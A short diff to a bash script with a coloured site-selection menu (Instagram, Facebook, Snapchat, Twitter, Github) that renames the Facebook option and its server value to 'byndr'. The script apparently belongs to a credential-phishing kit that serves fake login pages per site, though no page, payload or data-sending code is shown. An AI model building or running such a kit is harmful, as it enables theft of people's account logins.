@@ -16,7 +16,7 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 menu() {
 
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m byndr\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\n"
 printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\n"
 printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Github\n"
@@ -29,7 +29,7 @@ server="instagram"
 start1
 
 elif [[ $option == 2 || $option == 02 ]]; then
-server="facebook"
+server="byndr"
 start1
 elif [[ $option == 3 || $option == 03 ]]; then
 server="snapchat"
